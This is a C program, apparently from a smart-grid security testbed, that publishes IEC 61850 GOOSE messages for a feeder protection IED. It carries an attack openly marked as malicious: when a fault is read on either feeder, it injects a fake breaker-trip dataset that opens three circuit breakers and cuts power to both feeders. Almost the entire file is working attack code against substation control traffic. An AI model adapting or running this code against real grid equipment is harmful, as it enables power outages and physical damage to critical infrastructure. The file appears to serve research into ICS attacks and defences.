/*
 * goose_publisher_PIOC_8631ab
 
#####################################################################################################################################################

Malicious behaviour:

Network level: If a short circuit happens on either Feeder1 or Feeder2, the allData fields of GOOSE packets published by IED_FDR are modified to (0101100) (open CB2_22kV CB_FDR1, CB_FDR2) to physcial process (Simulink).

Physical process level:If a short circuit happens on either Feeder1 or Feeder2, (CB2_22kV CB_FDR1, CB_FDR2) will be opened. Both Feeder1 or Feeder2 are no longer supplied with any power load.

#####################################################################################################################################################
*/

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//#######Define the attack settings #########//

//The number of packets in one period
#define No_pkts all 

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int HBnew = 1000; // the new HB when st changes
	int CBstval[7] = {0,1,0,0,0,0,0}; //current CBstval
    int PreCBstval[7] = {0,1,0,0,0,0,0}; //previous CBstval
//########################################################Malicious codes begin###########################################################################################//
    int FakeTrip[7] = {0,1,0,1,1,0,0}; // Fake trip CBstval
//########################################################Malicious codes end#############################################################################################//
    int idx_cycle50ms = 1;
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3103;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x03;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	* Create a new GOOSE publisher instance. As the second parameter the interface
	* name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	* is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	* stack_config.h is used.
	*/ 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s		

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "QUTZS_FDRPIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_FDRPIOC/LLN0$DS_FDR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);

	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create(); 	
	    	FILE *fp;
	    	int i;
	    	
	    	fp=fopen("/home/ray/Desktop/FDR OverCur Prot/TripRecord/TripFromPLC.csv","r");
			for (i=0; i<7; i++)
		    	fscanf(fp,"%d,", &CBstval[i]);   
	    	fclose(fp);
	    	
//########################################################Malicious codes begin###########################################################################################//
	    	if ( (CBstval[3] == 1) || (CBstval[4] == 1) ) { // A fault occurs on either FDR1 or FDR2
				for (i = 0; i <7; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(FakeTrip[i]));
					LinkedList_add(dataSetValues, quality); 
				}
	    	}
			else {	    	 	
				for (i = 0; i <7; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(CBstval[i]));
					LinkedList_add(dataSetValues, quality); 
				}
			}    	 
//########################################################Malicious codes end#############################################################################################//	    
			
			if (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) {
				GoosePublisher_increaseStNum(publisher); //if CB status changes (current != previous), stNum+1
				if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
					printf("Error sending message!\n");
				}
				memcpy(PreCBstval,CBstval,sizeof(CBstval));
				idx_cycle50ms = 1; // Reset the cycle index to 1
				HBnew = 1; // Heartbeat changes to HBnew (1ms)
				Thread_sleep(HBnew); 
				HBnew = HBnew*4;	// Heartbeat times 4 = 4ms
			}
			else {
				if (HBnew < 999) {
					if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
						printf("Error sending message!\n");
					}
					Thread_sleep(HBnew);
					HBnew = HBnew*4;	// Heartbeat multiply 4 every time, until heartbeat > 1000
				}
				else {
					if (idx_cycle50ms == 1) { // send message only at the 1st 50ms-cycle
						if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
							printf("Error sending message!\n");
						}
						idx_cycle50ms++;		
					}
					if ( (idx_cycle50ms > 1) && (idx_cycle50ms < 20) ) {
						idx_cycle50ms++; // 2nd to 19th 50ms-cycle
					}
					if (idx_cycle50ms == 20) {
						idx_cycle50ms = 1; // Reset index to 1
					}
					Thread_sleep(50);
				}
		    }
		    
	       	//#Create a new MmsValue instance of type MMS_VISIBLE_STRING from the specified byte array#//
			//LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
		
			//LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);
			LinkedList_destroyStatic(dataSetValues);
		}
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}   	
}
